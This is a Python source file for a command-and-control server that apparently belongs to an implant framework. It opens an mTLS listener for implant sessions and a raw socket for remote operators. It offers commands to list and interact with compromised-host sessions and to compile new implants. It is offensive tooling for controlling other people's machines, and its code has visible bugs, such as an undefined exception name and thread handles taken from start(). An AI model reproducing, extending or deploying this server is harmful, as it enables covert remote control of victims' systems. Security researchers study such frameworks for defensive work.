#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
import socket
import threading

from mtls import mtls
from generate.generate import generate
from queue import Queue
from handler.handler import Handler



class C2Server(object):
    connections = []

    def __init__(self, host, port):
        self.host = host
        self.port = port
        ## Generating stuff for implant comms ##
        self.requestq = Queue()
        self.handler = Handler(self.requestq)
        print("Generating certificates...")
        self.listener = mtls.Listener(self.requestq)
        ## Generating stuff for operator comms EXPERIMENTAL##
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

        self.shutdown = 0

    def serverMain(self):
        t1 = threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console
        while self.shutdown == 0:
            userin = input("$ ")
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            commandStr = ' '.join(userin)
            logging.info("Command: " + commandStr)
            self.executecommand(userin.split())

    def listen(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        #print("[+]Listening....")
        while True: #keep listening, start a new thread when a client connects
            client, address = self.sock.accept()
            print("\n[+]Connected to a new client at " + address[0] + ":" + str(address[1]) + "\n")
            #client.settimeout(60)
            t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
            self.connections.append(address) #dont know why to do this, just seems right?

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data and (str(data.decode('ascii')).lower() != 'exit'):
                    recvData = str(data.decode('ascii')).lower()
                    #print("RECIVED: " + recvData)
                    response = self.executecommand(recvData.split())
                    #print("SENDING: " + response)
                    client.send(response.encode('ascii'))
                    #print("sent")
                else:
                    print("[+]Disconnected " + address[0] +":"+ str(address[1]))
                    raise error('Client disconnected')
            except:
                client.close()
                return False


    def executecommand(self, command):
        #command is an array of strings
        if len(command) < 1:
            print("Invalid Command")
            return("Invalid Command")
        elif command[0] == "sessions":
            for id in self.listener.sessions.list():
                print(id)
        # Interact with a session
        elif command[0] == "use":
            if len(command) == 2:
                conn, addr = self.listener.sessions.get(command[1]) 
                print(f"Using session with {addr}")
                mtls.session(conn)
            else:
                print("Usage: use <session>")
        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.listener.client_certs)
        elif command[0] == "users":
            self.printOperators()
        else:
            print("Unknown Command")
            return("Unknown Command")


    def printOperators(self):
        for conn in self.connections:
            print(conn)


def main():
    host = '' #used for operator connection
    port_num = 12345 #used for operator connection
    C2Server(host,port_num).serverMain()


if __name__ == "__main__":
    main()
